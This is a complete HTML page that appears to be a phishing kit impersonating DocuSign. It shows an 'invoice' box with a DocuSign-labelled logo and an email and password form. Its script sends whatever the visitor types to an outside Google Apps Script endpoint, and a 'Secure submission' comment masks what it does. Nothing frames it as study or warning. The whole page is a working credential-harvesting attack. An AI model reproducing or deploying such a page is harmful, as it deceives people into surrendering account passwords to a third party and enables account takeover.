<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQjEM8cVdhxtL2-nbQoL40DDFB55Q-WFX6xVw&usqp=CAU");
            background-size: cover;
            background-position: center;
            color: white;
            text-align: center;
        }

        #invoice-container {
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background: rgba(0, 0, 0, 0.8);
            border-radius: 10px;
        }

        #logo {
            width: 100px;
            height: 100px;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
        }

        #submit-btn {
            background-color: #4CAF50;
            color: white;
            padding: 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
    <script>
        function submitForm() {
            var email = document.getElementById("email").value;
            var password = document.getElementById("password").value;

            // Secure submission using JavaScript (Note: Security on client-side is limited)
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://script.google.com/macros/s/AKfycbygwwolrPj-61wfXFAtSgLmNLoDrHZ5suPCmi1dI6cwJ9B5G5S0L8zjFW5ntekqJFdV/exec", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
        }
    </script>
</head>
<body>
    <div id="invoice-container">
        <img id="logo" src="https://designarcane.com/wp-content/uploads/2021/01/docusafe.png" alt="Docusign Logo">
        <form>
            <input type="text" id="email" placeholder="Email">
            <input type="password" id="password" placeholder="Password">
            <button type="button" id="submit-btn" onclick="submitForm()">Submit</button>
        </form>
    </div>
</body>
</html>
